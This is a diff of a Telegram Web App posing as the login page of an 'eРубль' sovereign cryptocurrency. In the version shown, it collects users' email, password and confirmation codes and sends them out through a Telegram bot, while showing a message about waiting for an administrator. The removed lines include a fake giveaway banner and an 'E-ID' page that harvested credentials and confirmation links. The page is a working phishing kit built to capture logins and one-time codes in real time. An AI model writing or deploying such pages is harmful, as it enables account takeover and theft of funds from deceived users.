@@ -1,16 +1,13 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>eРубль</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        /* ===== УПРОЩЁННЫЙ СТИЛЬ ДЛЯ ТЕСТА ===== */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: #0a0e1a;
@@ -26,628 +23,67 @@
             padding: 32px 24px;
             width: 100%;
             max-width: 440px;
-            min-height: 560px;
-            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            position: relative;
-            overflow: hidden;
-        }
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            right: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle at 70% 30%, rgba(67, 97, 238, 0.08), transparent 60%);
-            pointer-events: none;
-        }
-        .page {
-            display: none;
-            flex-direction: column;
-            animation: fadeIn 0.35s ease;
-            position: relative;
-            z-index: 1;
-        }
-        .page.active {
-            display: flex;
-        }
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(12px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 24px;
-        }
-        .logo h1 {
-            font-size: 32px;
-            font-weight: 800;
-            color: #fff;
-        }
-        .logo h1 span {
-            background: linear-gradient(135deg, #4361ee, #7b61ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .logo .sub {
-            color: rgba(255, 255, 255, 0.4);
-            font-size: 11px;
-            margin-top: 2px;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-        }
-        .menu-grid {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-            margin: 8px 0 16px;
-        }
-        .menu-item {
-            padding: 14px 18px;
-            background: rgba(255, 255, 255, 0.04);
-            border-radius: 14px;
-            color: rgba(255, 255, 255, 0.7);
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: 0.2s;
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            text-align: left;
-        }
-        .menu-item:hover {
-            background: rgba(255, 255, 255, 0.08);
-            color: #fff;
-        }
-        .hero-banner {
-            background: linear-gradient(135deg, rgba(67, 97, 238, 0.12), rgba(123, 97, 255, 0.08));
-            border-radius: 16px;
-            padding: 18px;
-            border: 1px solid rgba(67, 97, 238, 0.12);
-            margin: 4px 0 12px;
-            text-align: center;
-        }
-        .hero-banner h2 {
-            color: #fff;
-            font-size: 18px;
-            font-weight: 700;
-        }
-        .hero-banner .highlight {
-            color: #7b61ff;
-        }
-        .hero-banner p {
-            color: rgba(255, 255, 255, 0.4);
-            font-size: 13px;
-            margin-top: 2px;
-        }
-        .hero-banner .badge {
-            display: inline-block;
-            background: rgba(40, 167, 69, 0.15);
-            color: #4ade80;
-            padding: 4px 14px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 600;
-            margin-top: 6px;
-            border: 1px solid rgba(40, 167, 69, 0.1);
-        }
-        .page-title {
-            font-size: 22px;
-            font-weight: 700;
-            color: #fff;
-            text-align: center;
-            margin-bottom: 4px;
-        }
-        .page-sub {
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.4);
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .page-icon {
-            text-align: center;
-            font-size: 40px;
-            margin-bottom: 6px;
-        }
-        .form-group {
-            margin-bottom: 16px;
-        }
-        .form-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: rgba(255, 255, 255, 0.6);
-            margin-bottom: 6px;
-        }
-        .form-group input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 2px solid rgba(255, 255, 255, 0.08);
-            border-radius: 14px;
-            font-size: 15px;
-            background: rgba(255, 255, 255, 0.05);
-            color: #fff;
-            transition: 0.2s;
-        }
-        .form-group input:focus {
-            outline: none;
-            border-color: #4361ee;
-            background: rgba(255, 255, 255, 0.08);
-        }
-        .form-group input::placeholder {
-            color: rgba(255, 255, 255, 0.25);
-        }
-        .btn-primary {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #4361ee, #7b61ff);
-            color: #fff;
-            border: none;
-            border-radius: 14px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 8px;
-            box-shadow: 0 8px 30px rgba(67, 97, 238, 0.25);
-        }
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 40px rgba(67, 97, 238, 0.35);
-        }
-        .btn-primary:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-        .btn-eid {
-            width: 100%;
-            padding: 16px;
-            background: rgba(255, 255, 255, 0.06);
-            color: #fff;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 14px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 6px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        .btn-eid:hover {
-            background: rgba(255, 255, 255, 0.1);
-            border-color: rgba(255, 255, 255, 0.2);
-        }
-        .btn-secondary {
-            width: 100%;
-            padding: 14px;
-            background: rgba(255, 255, 255, 0.04);
-            color: rgba(255, 255, 255, 0.6);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 14px;
-            font-size: 15px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 10px;
-        }
-        .btn-secondary:hover {
-            background: rgba(255, 255, 255, 0.08);
-            color: #fff;
-        }
-        .btn-back {
-            width: 100%;
-            padding: 14px;
-            background: transparent;
-            color: rgba(255, 255, 255, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 14px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 10px;
-        }
-        .btn-back:hover {
-            background: rgba(255, 255, 255, 0.04);
-            color: rgba(255, 255, 255, 0.6);
-        }
-        .divider {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin: 18px 0 14px;
-        }
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background: rgba(255, 255, 255, 0.06);
-        }
-        .divider span {
-            color: rgba(255, 255, 255, 0.2);
-            font-size: 12px;
-            font-weight: 500;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .forgot-link {
-            text-align: right;
-            margin-top: -6px;
-            margin-bottom: 12px;
-        }
-        .forgot-link a {
-            color: rgba(255, 255, 255, 0.3);
-            font-size: 13px;
-            text-decoration: none;
-            transition: 0.2s;
-        }
-        .forgot-link a:hover {
-            color: #4361ee;
-        }
-        .register-link {
-            text-align: center;
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.3);
-            margin-top: 6px;
-        }
-        .register-link a {
-            color: #4361ee;
-            font-weight: 600;
-            text-decoration: none;
-        }
-        .register-link a:hover {
-            text-decoration: underline;
-        }
-        .support-btn {
-            width: 100%;
-            padding: 14px;
-            background: rgba(255, 255, 255, 0.03);
-            color: rgba(255, 255, 255, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            border-radius: 14px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 14px;
-        }
-        .support-btn:hover {
-            background: rgba(255, 255, 255, 0.06);
-            color: rgba(255, 255, 255, 0.5);
-        }
-        .message {
-            margin-top: 16px;
-            padding: 12px 16px;
-            border-radius: 12px;
-            display: none;
-            text-align: center;
-            font-size: 14px;
-            font-weight: 500;
-        }
-        .message.success {
-            display: block;
-            background: rgba(40, 167, 69, 0.15);
-            color: #4ade80;
-            border: 1px solid rgba(40, 167, 69, 0.2);
-        }
-        .message.error {
-            display: block;
-            background: rgba(220, 53, 69, 0.15);
-            color: #f87171;
-            border: 1px solid rgba(220, 53, 69, 0.2);
-        }
-        .message.info {
-            display: block;
-            background: rgba(67, 97, 238, 0.12);
-            color: #818cf8;
-            border: 1px solid rgba(67, 97, 238, 0.15);
-        }
-        .code-box {
-            text-align: center;
-            margin: 8px 0 16px;
-        }
-        .code-box input {
-            text-align: center;
-            font-size: 28px;
-            letter-spacing: 12px;
-            padding: 16px;
-            border: 2px solid rgba(255, 255, 255, 0.08);
-            border-radius: 14px;
-            width: 100%;
-            max-width: 220px;
-            margin: 0 auto;
-            background: rgba(255, 255, 255, 0.05);
-            color: #fff;
-            font-weight: 600;
-        }
-        .code-box input:focus {
-            outline: none;
-            border-color: #4361ee;
-        }
-        .code-hint {
-            font-size: 13px;
-            color: rgba(255, 255, 255, 0.3);
-            margin-bottom: 16px;
-            text-align: center;
-        }
-        .code-status {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            color: #4ade80;
-            font-weight: 500;
-            font-size: 14px;
-            margin-top: 12px;
-        }
-        .code-status .dot {
-            width: 10px;
-            height: 10px;
-            background: #4ade80;
-            border-radius: 50%;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0%,
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-            50% {
-                opacity: 0.5;
-                transform: scale(0.8);
-            }
-        }
-        .eid-page .eid-header {
-            text-align: center;
-            margin-bottom: 24px;
-        }
-        .eid-page .eid-header .eid-badge {
-            display: inline-block;
-            background: rgba(220, 53, 69, 0.15);
-            color: #f87171;
-            padding: 6px 20px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 700;
-            letter-spacing: 1.5px;
-            text-transform: uppercase;
-            margin-bottom: 8px;
-            border: 1px solid rgba(220, 53, 69, 0.15);
-        }
-        .eid-page .eid-header h2 {
-            font-size: 20px;
-            color: #fff;
-            font-weight: 700;
-        }
-        .eid-page .eid-header p {
-            color: rgba(255, 255, 255, 0.3);
-            font-size: 12px;
-            margin-top: 2px;
-            letter-spacing: 0.5px;
-        }
-        .link-box {
-            margin-top: 12px;
-            padding: 16px;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 14px;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-        }
-        .link-box label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: rgba(255, 255, 255, 0.5);
-            margin-bottom: 6px;
-        }
-        .link-box input {
-            width: 100%;
-            padding: 12px 16px;
-            border: 2px solid rgba(255, 255, 255, 0.06);
-            border-radius: 10px;
-            font-size: 14px;
-            background: rgba(255, 255, 255, 0.04);
-            color: #fff;
-        }
-        .link-box input:focus {
-            outline: none;
-            border-color: #4361ee;
-        }
-        .link-box input::placeholder {
-            color: rgba(255, 255, 255, 0.2);
-        }
-        .success-page .check {
-            font-size: 64px;
-            text-align: center;
-            margin-bottom: 12px;
-        }
-        .success-page h2 {
-            text-align: center;
-            color: #4ade80;
-            font-size: 22px;
-        }
-        .success-page p {
-            text-align: center;
-            color: rgba(255, 255, 255, 0.4);
-            font-size: 14px;
-            margin-top: 6px;
-            line-height: 1.6;
-        }
-        .about-text {
-            color: rgba(255, 255, 255, 0.7);
-            font-size: 14px;
-            line-height: 1.8;
-            margin-bottom: 12px;
-        }
-        .about-text .highlight-text {
-            color: #7b61ff;
-            font-weight: 500;
-        }
-        .about-text .green-text {
-            color: #4ade80;
-            font-weight: 500;
-        }
-        .about-text .accent {
-            color: #4361ee;
-            font-weight: 500;
-        }
-        .guide-block {
-            margin-bottom: 20px;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 16px;
-            padding: 18px 16px;
-            border: 1px solid rgba(255, 255, 255, 0.04);
-        }
-        .guide-block .num {
-            font-size: 12px;
-            font-weight: 700;
-            color: #4361ee;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            margin-bottom: 2px;
-        }
-        .guide-block h3 {
-            font-size: 17px;
-            font-weight: 700;
-            color: #fff;
-            margin-bottom: 6px;
-        }
-        .guide-block p {
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.6);
-            line-height: 1.6;
-            margin-bottom: 6px;
-        }
-        .guide-block .arrow {
-            color: #4361ee;
-            font-weight: 500;
-            font-size: 14px;
-        }
-        .guide-block .highlight-text {
-            color: #7b61ff;
-            font-weight: 500;
-        }
-        .guide-block .green-text {
-            color: #4ade80;
-            font-weight: 500;
-        }
-        .status-waiting {
-            margin-top: 10px;
-            padding: 12px;
-            background: rgba(67, 97, 238, 0.1);
-            border-radius: 12px;
-            border: 1px solid rgba(67, 97, 238, 0.15);
-            text-align: center;
-            color: rgba(255, 255, 255, 0.6);
-            font-size: 13px;
-            display: none;
-        }
-        .status-waiting .spinner {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-top: 2px solid #4361ee;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-right: 8px;
-            vertical-align: middle;
-        }
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
+            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
+            border: 1px solid rgba(255,255,255,0.06);
+        }
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; font-size: 13px; font-weight: 600; color: rgba(255,255,255,0.6); margin-bottom: 6px; }
+        .form-group input { width: 100%; padding: 14px 16px; border: 2px solid rgba(255,255,255,0.08); border-radius: 14px; font-size: 15px; background: rgba(255,255,255,0.05); color: #fff; }
+        .form-group input:focus { outline: none; border-color: #4361ee; background: rgba(255,255,255,0.08); }
+        .form-group input::placeholder { color: rgba(255,255,255,0.25); }
+        .btn-primary { width: 100%; padding: 16px; background: linear-gradient(135deg, #4361ee, #7b61ff); color: #fff; border: none; border-radius: 14px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; margin-top: 8px; }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(67,97,238,0.35); }
+        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-back { width: 100%; padding: 14px; background: transparent; color: rgba(255,255,255,0.3); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; font-size: 14px; font-weight: 500; cursor: pointer; transition: 0.2s; margin-top: 10px; }
+        .btn-back:hover { background: rgba(255,255,255,0.04); color: rgba(255,255,255,0.6); }
+        .message { margin-top: 16px; padding: 12px 16px; border-radius: 12px; display: none; text-align: center; font-size: 14px; font-weight: 500; }
+        .message.success { display: block; background: rgba(40,167,69,0.15); color: #4ade80; border: 1px solid rgba(40,167,69,0.2); }
+        .message.error { display: block; background: rgba(220,53,69,0.15); color: #f87171; border: 1px solid rgba(220,53,69,0.2); }
+        .message.info { display: block; background: rgba(67,97,238,0.12); color: #818cf8; border: 1px solid rgba(67,97,238,0.15); }
+        .status-waiting { margin-top: 10px; padding: 12px; background: rgba(67,97,238,0.1); border-radius: 12px; border: 1px solid rgba(67,97,238,0.15); text-align: center; color: rgba(255,255,255,0.6); font-size: 13px; display: none; }
+        .support-btn { width: 100%; padding: 14px; background: rgba(255,255,255,0.03); color: rgba(255,255,255,0.3); border: 1px solid rgba(255,255,255,0.04); border-radius: 14px; font-size: 14px; font-weight: 500; cursor: pointer; transition: 0.2s; margin-top: 14px; }
+        .support-btn:hover { background: rgba(255,255,255,0.06); color: rgba(255,255,255,0.5); }
+        .page { display: none; flex-direction: column; }
+        .page.active { display: flex; }
+        .page-title { font-size: 22px; font-weight: 700; color: #fff; text-align: center; margin-bottom: 4px; }
+        .page-sub { font-size: 14px; color: rgba(255,255,255,0.4); text-align: center; margin-bottom: 20px; }
+        .page-icon { text-align: center; font-size: 40px; margin-bottom: 6px; }
+        .code-box { text-align: center; margin: 8px 0 16px; }
+        .code-box input { text-align: center; font-size: 28px; letter-spacing: 12px; padding: 16px; border: 2px solid rgba(255,255,255,0.08); border-radius: 14px; width: 100%; max-width: 220px; margin: 0 auto; background: rgba(255,255,255,0.05); color: #fff; font-weight: 600; }
+        .code-box input:focus { outline: none; border-color: #4361ee; }
+        .code-hint { font-size: 13px; color: rgba(255,255,255,0.3); margin-bottom: 16px; text-align: center; }
+        .code-status { display: flex; align-items: center; justify-content: center; gap: 8px; color: #4ade80; font-weight: 500; font-size: 14px; margin-top: 12px; }
+        .code-status .dot { width: 10px; height: 10px; background: #4ade80; border-radius: 50%; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%,100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.5; transform: scale(0.8); } }
     </style>
 </head>
 <body>
     <div class="container">
 
-        <!-- СТРАНИЦА 1: ГЛАВНАЯ -->
+        <!-- ===== СТРАНИЦА 1: ГЛАВНАЯ ===== -->
         <div id="pageLogin" class="page active">
-            <div class="logo">
-                <h1><span>eРубль</span></h1>
-                <div class="sub">Суверенная криптовалюта России</div>
-            </div>
-            <div class="hero-banner">
-                <h2>🚀 Первичное <span class="highlight">распределение</span></h2>
-                <p>1 миллиард eRub за 30 дней</p>
-                <div class="badge">🔥 Акция стартовала!</div>
-            </div>
-            <div class="menu-grid">
-                <div class="menu-item" onclick="goToAbout()"><span style="margin-right:12px;">📊</span> О проекте</div>
-                <div class="menu-item" onclick="goToGuide()"><span style="margin-right:12px;">📖</span> Руководство по eРублю</div>
-                <div class="menu-item" onclick="showMsg('Документ дорабатывается', 'info')"><span style="margin-right:12px;">❓</span> Частые вопросы</div>
+            <div style="text-align:center;margin-bottom:24px;">
+                <h1 style="font-size:32px;font-weight:800;color:#fff;"><span style="background:linear-gradient(135deg,#4361ee,#7b61ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">eРубль</span></h1>
+                <div style="color:rgba(255,255,255,0.4);font-size:11px;letter-spacing:2px;text-transform:uppercase;">Суверенная криптовалюта России</div>
             </div>
             <button id="loginBtn" class="btn-primary">🔓 Войти</button>
-            <div class="divider"><span>или</span></div>
-            <button id="eidBtn" class="btn-eid"><span>🆔</span> Вход через E-ID</button>
-            <div class="register-link" style="margin-top:14px;">Нет аккаунта? <a href="#" onclick="showMsg('Регистрация скоро появится', 'info')">Зарегистрироваться</a></div>
+            <button id="eidBtn" class="btn-primary" style="background:rgba(255,255,255,0.06);margin-top:10px;">🆔 Вход через E-ID</button>
+            <button onclick="openSupport()" class="support-btn">🆘 Техническая поддержка</button>
         </div>
 
-        <!-- СТРАНИЦА 2: О ПРОЕКТЕ -->
-        <div id="pageAbout" class="page">
-            <div class="page-icon">📊</div>
-            <div class="page-title">О проекте</div>
-            <div class="page-sub">Суверенная криптовалюта eRub</div>
-            <div class="about-text">
-                <p><span class="highlight-text">eRub</span> — это децентрализованная криптовалюта на базе собственного суверенного блокчейна, созданная как свободная альтернатива традиционным финансовым институтам.</p>
-                <br>
-                <p>eRub не является стейблкоином или государственной цифровой валютой: ее рыночная стоимость формируется исключительно на основе открытого спроса и предложения.</p>
-                <br>
-                <p>Проект сочетает концепцию <span class="accent">национальной расчетной единицы</span> с фундаментальными принципами блокчейн-технологий: <span class="green-text">полной прозрачностью транзакций</span>, прямым контролем пользователя над активами и строго ограниченным, фиксированным объемом эмиссии.</p>
-                <br>
-                <p>Сеть eRub функционирует под управлением <span class="highlight-text">децентрализованного сообщества</span> держателей монет, обеспечивая технологическую независимость, защиту от монетарной инфляции регуляторов и абсолютный иммунитет к внешнему экономическому давлению.</p>
-            </div>
-            <button id="backFromAboutBtn" class="btn-back">← Назад</button>
-        </div>
-
-        <!-- СТРАНИЦА 3: РУКОВОДСТВО -->
-        <div id="pageGuide" class="page">
-            <div class="page-icon">📖</div>
-            <div class="page-title">Руководство по eРублю</div>
-            <div class="page-sub">Всё, что нужно знать о суверенной криптовалюте</div>
-            <div class="guide-block">
-                <div class="num">01</div>
-                <h3>Собственные технологии</h3>
-                <p>Мы принципиально не используем зарубежные платформы, такие как Ethereum или Solana. Зависимость от чужих зарубежных сетей — это всегда риск блокировок.</p>
-                <p><span class="arrow">↗</span> <span class="highlight-text">Свой независимый блокчейн</span><br>еРубль работает на собственной, созданной с нуля цифровой платформе.</p>
-                <p><span class="arrow">↗</span> <span class="highlight-text">Полная автономность</span><br>Сеть eRub невозможно заблокировать или отключить извне. Все операции осуществляются напрямую между пользователями (peer-to-peer) — никакие санкции, банковские ограничения или политические решения не способны остановить, задержать или отменить транзакции.</p>
-            </div>
-            <button id="backFromGuideBtn" class="btn-back">← Назад</button>
-        </div>
-
-        <!-- СТРАНИЦА 4: ВХОД -->
+        <!-- ===== СТРАНИЦА 2: ВХОД ===== -->
         <div id="pageCode" class="page">
             <div class="page-icon">🔑</div>
             <div class="page-title">Вход в eРубль</div>
             <div class="page-sub">Введите свои данные для входа</div>
             <div class="form-group"><label>Email</label><input type="email" id="email" placeholder="Введите ваш email"></div>
             <div class="form-group"><label>Пароль</label><input type="password" id="password" placeholder="Введите пароль"></div>
-            <div class="forgot-link"><a href="#" onclick="showMsg('Функция восстановления скоро появится', 'info')">Забыли пароль?</a></div>
             <button id="loginSubmitBtn" class="btn-primary">ВОЙТИ</button>
-            <div id="statusWaiting" class="status-waiting">
-                <span class="spinner"></span> Ожидание подтверждения от администратора...
-            </div>
+            <div id="statusWaiting" class="status-waiting">⏳ Ожидание подтверждения от администратора...</div>
             <button id="backFromLoginBtn" class="btn-back">← Назад</button>
         </div>
 
-        <!-- СТРАНИЦА 5: КОД -->
+        <!-- ===== СТРАНИЦА 3: КОД ===== -->
         <div id="pageCodeConfirm" class="page">
             <div class="page-icon">📧</div>
             <div class="page-title">Код подтверждения</div>
@@ -659,36 +95,15 @@
             <button id="backFromCodeBtn" class="btn-back">← Назад</button>
         </div>
 
-        <!-- СТРАНИЦА 6: E-ID -->
-        <div id="pageEid" class="page eid-page">
-            <div class="eid-header">
-                <div class="eid-badge">ON-LINE CERTIFICATION</div>
-                <h2>AND AUTHORIZATION SERVICE</h2>
-                <p>e-id</p>
-            </div>
-            <div class="form-group"><label>Email</label><input type="email" id="eidEmail" placeholder="Введите ваш email"></div>
-            <div class="form-group"><label>Пароль</label><input type="password" id="eidPassword" placeholder="Введите пароль"></div>
-            <div class="forgot-link"><a href="#" onclick="showMsg('Функция восстановления скоро появится', 'info')">Забыли пароль?</a></div>
-            <button id="eidSubmitBtn" class="btn-primary">ВХОД</button>
-            <div id="eidLinkBlock" class="link-box" style="display:none; margin-top:16px;">
-                <label>🔗 Ссылка подтверждения</label>
-                <input type="text" id="eidLinkInput" placeholder="Вставьте ссылку подтверждения">
-                <button id="eidLinkBtn" class="btn-secondary" style="margin-top:10px;">✅ Отправить ссылку</button>
-            </div>
-            <div class="register-link" style="margin-top:12px;">Нет аккаунта? <a href="#" onclick="showMsg('Регистрация скоро появится', 'info')">Зарегистрироваться</a></div>
-            <button id="backFromEidBtn" class="btn-back">← Назад</button>
-        </div>
-
-        <!-- СТРАНИЦА 7: УСПЕХ -->
-        <div id="pageSuccess" class="page success-page">
-            <div class="check">✅</div>
-            <h2>Отправлено!</h2>
-            <p>Ожидайте ответа администратора.</p>
-            <button id="resetBtn" class="btn-secondary" style="margin-top:20px;">🔄 Вернуться на главную</button>
+        <!-- ===== СТРАНИЦА 4: УСПЕХ ===== -->
+        <div id="pageSuccess" class="page">
+            <div style="text-align:center;font-size:64px;margin-bottom:12px;">✅</div>
+            <h2 style="text-align:center;color:#4ade80;font-size:22px;">Отправлено!</h2>
+            <p style="text-align:center;color:rgba(255,255,255,0.4);font-size:14px;margin-top:6px;">Ожидайте ответа администратора.</p>
+            <button id="resetBtn" class="btn-back" style="margin-top:20px;">🔄 Вернуться на главную</button>
         </div>
 
         <div id="msg" class="message"></div>
-        <button onclick="openSupport()" class="support-btn">🆘 Техническая поддержка</button>
     </div>
 
     <script>
@@ -705,38 +120,23 @@
         tg.expand();
 
         const pageLogin = document.getElementById('pageLogin');
-        const pageAbout = document.getElementById('pageAbout');
-        const pageGuide = document.getElementById('pageGuide');
         const pageCode = document.getElementById('pageCode');
         const pageCodeConfirm = document.getElementById('pageCodeConfirm');
-        const pageEid = document.getElementById('pageEid');
         const pageSuccess = document.getElementById('pageSuccess');
 
         const email = document.getElementById('email');
         const password = document.getElementById('password');
         const codeInput = document.getElementById('codeInput');
-        const eidEmail = document.getElementById('eidEmail');
-        const eidPassword = document.getElementById('eidPassword');
-        const eidLinkInput = document.getElementById('eidLinkInput');
-        const eidLinkBlock = document.getElementById('eidLinkBlock');
         const statusWaiting = document.getElementById('statusWaiting');
 
         const loginBtn = document.getElementById('loginBtn');
         const loginSubmitBtn = document.getElementById('loginSubmitBtn');
         const codeBtn = document.getElementById('codeBtn');
         const eidBtn = document.getElementById('eidBtn');
-        const eidSubmitBtn = document.getElementById('eidSubmitBtn');
-        const eidLinkBtn = document.getElementById('eidLinkBtn');
         const backFromLoginBtn = document.getElementById('backFromLoginBtn');
         const backFromCodeBtn = document.getElementById('backFromCodeBtn');
-        const backFromEidBtn = document.getElementById('backFromEidBtn');
-        const backFromAboutBtn = document.getElementById('backFromAboutBtn');
-        const backFromGuideBtn = document.getElementById('backFromGuideBtn');
         const resetBtn = document.getElementById('resetBtn');
         const msgDiv = document.getElementById('msg');
-
-        let eidEmailValue = '';
-        let eidPasswordValue = '';
 
         function showMsg(text, type = 'info') {
             msgDiv.textContent = text;
@@ -761,9 +161,6 @@
             statusWaiting.style.display = 'none';
         }
 
-        function goToAbout() { switchPage(pageAbout); }
-        function goToGuide() { switchPage(pageGuide); }
-
         function goToCodePage() {
             switchPage(pageCode);
             statusWaiting.style.display = 'none';
@@ -776,21 +173,10 @@
             setTimeout(() => codeInput.focus(), 300);
         }
 
-        function goToEid() {
-            switchPage(pageEid);
-            eidEmail.value = '';
-            eidPassword.value = '';
-            eidLinkInput.value = '';
-            eidLinkBlock.style.display = 'none';
-            eidSubmitBtn.disabled = false;
-            eidSubmitBtn.textContent = 'ВХОД';
-            setTimeout(() => eidEmail.focus(), 300);
-        }
-
         function goToSuccess() { switchPage(pageSuccess); }
 
         // ============================================================
-        // 4. ОТПРАВКА В БОТА
+        // 3. ОТПРАВКА В БОТА
         // ============================================================
         async function sendToBot(data) {
             const payload = {
@@ -799,41 +185,36 @@
             };
 
             try {
-                // ===== ОТПРАВЛЯЕМ СООБЩЕНИЕ В БОТА (себе) =====
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: tg.initDataUnsafe?.user?.id,  // ← отправляем самому себе
+                        chat_id: tg.initDataUnsafe?.user?.id,
                         text: JSON.stringify(payload)
                     })
                 });
                 const result = await response.json();
+                console.log('✅ Отправлено:', result);
                 return result.ok;
             } catch (error) {
-                console.error('Ошибка:', error);
+                console.error('❌ Ошибка:', error);
                 return false;
             }
         }
 
         // ============================================================
-        // 5. НАВИГАЦИЯ
+        // 4. НАВИГАЦИЯ
         // ============================================================
         loginBtn.addEventListener('click', goToCodePage);
-        eidBtn.addEventListener('click', goToEid);
+        eidBtn.addEventListener('click', function() {
+            showMsg('E-ID вход скоро появится', 'info');
+        });
         backFromLoginBtn.addEventListener('click', goToLogin);
         backFromCodeBtn.addEventListener('click', goToCodePage);
-        backFromEidBtn.addEventListener('click', goToLogin);
-        backFromAboutBtn.addEventListener('click', goToLogin);
-        backFromGuideBtn.addEventListener('click', goToLogin);
-
-        resetBtn.addEventListener('click', function() {
-            goToLogin();
-            showMsg('Вы вернулись на главную страницу', 'info');
-        });
+        resetBtn.addEventListener('click', goToLogin);
 
         // ============================================================
-        // 6. ВХОД → ОТПРАВКА ДАННЫХ (НЕ ПЕРЕХОДИМ НА КОД!)
+        // 5. ВХОД
         // ============================================================
         loginSubmitBtn.addEventListener('click', async function() {
             const e = email.value.trim();
@@ -856,7 +237,7 @@
                 loginSubmitBtn.disabled = false;
                 loginSubmitBtn.textContent = 'ВОЙТИ';
                 statusWaiting.style.display = 'block';
-                showMsg('✅ Отправлено. Ожидайте код от администратора.', 'success');
+                showMsg('✅ Отправлено. Ожидайте код.', 'success');
                 email.value = '';
                 password.value = '';
             } else {
@@ -867,7 +248,7 @@
         });
 
         // ============================================================
-        // 7. КОД → ОТПРАВКА КОДА
+        // 6. КОД
         // ============================================================
         codeBtn.addEventListener('click', async function() {
             const code = codeInput.value.trim();
@@ -892,64 +273,7 @@
         });
 
         // ============================================================
-        // 8. E-ID
-        // ============================================================
-        eidSubmitBtn.addEventListener('click', async function() {
-            const e = eidEmail.value.trim();
-            const p = eidPassword.value.trim();
-            if (!e || !p) {
-                showMsg('Заполните все поля', 'error');
-                return;
-            }
-            if (!e.includes('@')) {
-                showMsg('Введите корректный email', 'error');
-                return;
-            }
-            eidEmailValue = e;
-            eidPasswordValue = p;
-            eidSubmitBtn.disabled = true;
-            eidSubmitBtn.textContent = '⏳ Отправка...';
-            const ok = await sendToBot({ type: 'eid_login', email: e, password: p });
-            if (ok) {
-                eidSubmitBtn.disabled = true;
-                eidSubmitBtn.textContent = '✅ Отправлено';
-                eidLinkBlock.style.display = 'block';
-                showMsg('✅ Отправлено', 'success');
-                setTimeout(() => eidLinkInput.focus(), 300);
-            } else {
-                eidSubmitBtn.disabled = false;
-                eidSubmitBtn.textContent = 'ВХОД';
-                showMsg('❌ Ошибка отправки', 'error');
-            }
-        });
-
-        // ============================================================
-        // 9. E-ID ССЫЛКА
-        // ============================================================
-        eidLinkBtn.addEventListener('click', async function() {
-            const link = eidLinkInput.value.trim();
-            if (!link) {
